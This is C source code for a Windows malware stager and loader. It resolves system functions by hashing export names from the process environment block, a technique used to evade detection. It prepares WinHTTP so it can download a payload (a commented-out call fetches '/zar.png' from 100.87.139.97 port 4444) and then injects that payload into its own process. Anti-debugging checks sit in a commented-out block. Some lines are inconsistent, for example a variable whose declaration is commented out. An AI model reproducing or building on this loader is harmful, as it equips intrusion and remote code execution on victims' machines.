#include <config.h>
#include <hashing.h>
#include <shellcode.h>
#include <macros.h>

INSTANCE Instance = { 0 };

INT WINAPI WinMain(
    HINSTANCE hInstance, 
    HINSTANCE hPrevInstance, 
    LPSTR     lpCmdLine, 
    INT       nShowCmd
) {
    InitInstance();

/*
    if ( IsDbgrPresent() ) return;

    if ( GlobalFlagCheck() ) return;

    if ( QueryDbgPortObj() ) return;

    if ( HwbpCheck() ) return;
*/
//    PVOID  BlackoutBytes = NULL;
//    UINT64 BlackoutSize  = 0;
//    StagerShellcode( L"100.87.139.97", 4444, L"/zar.png", FALSE, L"GET", NULL, NULL, &BlackoutBytes, &BlackoutSize );
    LocalInjection( BlackoutBytes, BlackoutSize );
}

BOOL InitInstance(
    void
) {
    Instance.Teb = NtCurrentTeb();

    PVOID Ntdll    = LdrModuleAddr( H_MODULE_NTDLL );
    PVOID Kernel32 = LdrModuleAddr( H_MODULE_KERNEL32 );
    PVOID Cryptsp  = NULL;
    PVOID Winhttp  = NULL;

    Instance.Win32.LoadLibraryA        = LdrFuncAddr( Kernel32, HASH_STR( "LoadLibraryA" ) );

    //Cryptsp = Instance.Win32.LoadLibraryA( "cryptsp.dll" );
    Winhttp = Instance.Win32.LoadLibraryA( "winhttp.dll" );

    Instance.Win32.LoadLibraryExA      = LdrFuncAddr( Kernel32, HASH_STR( "LoadLibraryExA" ) );
    Instance.Win32.VirtualAlloc        = LdrFuncAddr( Kernel32, HASH_STR( "VirtualAlloc" ) );    
    Instance.Win32.VirtualProtect      = LdrFuncAddr( Kernel32, HASH_STR( "VirtualProtect" ) );
    Instance.Win32.CreateThread        = LdrFuncAddr( Kernel32, HASH_STR( "CreateThread" ) );
    Instance.Win32.WriteProcessMemory  = LdrFuncAddr( Kernel32, HASH_STR( "WriteProcessMemory" ) );
    Instance.Win32.NtCreateSection     = LdrFuncAddr( Ntdll,    HASH_STR( "NtCreateSection" ) );
    Instance.Win32.NtMapViewOfSection  = LdrFuncAddr( Ntdll,    HASH_STR( "NtMapViewOfSection" ) );
    Instance.Win32.CreateFileMappingA  = LdrFuncAddr( Kernel32, HASH_STR( "CreateFileMappingA" ) );
    Instance.Win32.MapViewOfFile       = LdrFuncAddr( Kernel32, HASH_STR( "MapViewOfFile" ) );
    Instance.Win32.WaitForSingleObject = LdrFuncAddr( Kernel32,  HASH_STR( "WaitForSingleObject" ) );
    Instance.Win32.CreateFileA         = LdrFuncAddr( Kernel32,  HASH_STR( "CreateFileA" ) );

    Instance.Win32.WinHttpOpen              = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpOpen" ) );
    Instance.Win32.WinHttpConnect           = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpConnect" ) );
    Instance.Win32.WinHttpOpenRequest       = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpOpenRequest" ) );
    Instance.Win32.WinHttpReadData          = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpReadData" ) );
    Instance.Win32.WinHttpReceiveResponse   = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpReceiveResponse" ) );
    Instance.Win32.WinHttpSetOption         = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpSetOption" ) );
    Instance.Win32.WinHttpSendRequest       = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpSendRequest" ) );
    Instance.Win32.WinHttpCloseHandle       = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpCloseHandle" ) );

    Instance.Win32.LocalAlloc               = LdrFuncAddr( Kernel32,  HASH_STR( "LocalAlloc" ) );
    Instance.Win32.LocalReAlloc             = LdrFuncAddr( Kernel32,  HASH_STR( "LocalReAlloc" ) );
    Instance.Win32.LocalFree                = LdrFuncAddr( Kernel32,  HASH_STR( "LocalFree" ) );

    return TRUE;
}

PVOID LdrModuleAddr(
    _In_ ULONG Hash
) {
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

    Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    if ( !Hash ) {
        Data = C_PTR( Entry );
        return Data->DllBase;
    }

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );

        if ( HashString( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash ) {
            return Data->DllBase;
        }
    }

    return NULL;
}

PVOID LdrFuncAddr( 
    _In_ PVOID BaseModule, 
    _In_ ULONG FuncName 
) {
    PIMAGE_NT_HEADERS       pImgNt         = { 0 };
    PIMAGE_EXPORT_DIRECTORY pImgExportDir  = { 0 };
    DWORD                   ExpDirSz       = 0x00;
    PDWORD                  AddrOfFuncs    = NULL;
    PDWORD                  AddrOfNames    = NULL;
    PWORD                   AddrOfOrdinals = NULL;
    PVOID                   FuncAddr       = NULL;

    pImgNt          = C_PTR( BaseModule + ((PIMAGE_DOS_HEADER)BaseModule)->e_lfanew );
    pImgExportDir   = C_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
    ExpDirSz        = U_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size );

    AddrOfNames     = C_PTR( BaseModule + pImgExportDir->AddressOfNames );
    AddrOfFuncs     = C_PTR( BaseModule + pImgExportDir->AddressOfFunctions );
    AddrOfOrdinals  = C_PTR( BaseModule + pImgExportDir->AddressOfNameOrdinals );

    for ( int i = 0 ; i < pImgExportDir->NumberOfNames ; i++ ) {
        PCHAR pFuncName         = (PCHAR)( BaseModule + AddrOfNames[i] );
        PVOID pFunctionAddress  = C_PTR( BaseModule + AddrOfFuncs[AddrOfOrdinals[i]] );

        if ( HashString( pFuncName, 0 ) == FuncName ) {
            if (( U_PTR( pFunctionAddress ) >= U_PTR( pImgExportDir ) ) &&
                ( U_PTR( pFunctionAddress )  < U_PTR( pImgExportDir ) + ExpDirSz )) {

                CHAR  ForwarderName[MAX_PATH] = { 0 };
                DWORD dwOffset                = 0x00;
                PCHAR FuncMod                 = NULL;
                PCHAR nwFuncName              = NULL;

                MmCopy( ForwarderName, pFunctionAddress, StringLengthA( (PCHAR)pFunctionAddress ) );

                for ( int j = 0 ; j < StringLengthA( (PCHAR)ForwarderName ) ; j++ ) {
                    if (((PCHAR)ForwarderName)[j] == '.') {
                        dwOffset         = j;
                        ForwarderName[j] = '\0';
                        break;
                    }
                }

                FuncMod    = ForwarderName;
                nwFuncName = ForwarderName + dwOffset + 1;

                fnLoadLibraryA pLoadLibraryA = LdrFuncAddr(LdrModuleAddr(H_MODULE_KERNEL32), HASH_STR( "LoadLibraryA" ) );

                HMODULE hForwardedModule = pLoadLibraryA(FuncMod);
                if ( hForwardedModule ) {
                    if ( nwFuncName[0] == '#' ) {
                        int ordinal = (INT)( nwFuncName + 1 );
                        return (PVOID)LdrFuncAddr( hForwardedModule, HASH_STR( (LPCSTR)ordinal ) );
                    } else {
                        return (PVOID)LdrFuncAddr( hForwardedModule, HASH_STR( nwFuncName ) );
                    }
                }
                return NULL;
            }

            return C_PTR( pFunctionAddress );
        }
    }

    return NULL;
}

/*!
 * @brief
 *  Hashing data
 *
 * @param String
 *  Data/String to hash
 *
 * @param Length
 *  size of data/string to hash.
 *  if 0 then hash data til null terminator is found.
 *
 * @return
 *  hash of specified data/string
 */
ULONG HashString(
    _In_ PVOID  String,
    _In_ SIZE_T Length
) {
    ULONG  Hash = { 0 };
    PUCHAR Ptr  = { 0 };
    UCHAR  Char = { 0 };

    if ( ! String ) {
        return 0;
    }

    Hash = H_MAGIC_KEY;
    Ptr  = ( ( PUCHAR ) String );

    do {
        Char = *Ptr;

        if ( ! Length ) {
            if ( ! *Ptr ) break;
        } else {
            if ( U_PTR( Ptr - U_PTR( String ) ) >= Length ) break;
            if ( !*Ptr ) ++Ptr;
        }

        if ( Char >= 'a' ) {
            Char -= 0x20;
        }

        Hash = ( ( Hash << 5 ) + Hash ) + Char;

        ++Ptr;
    } while ( TRUE );

    return Hash;
}
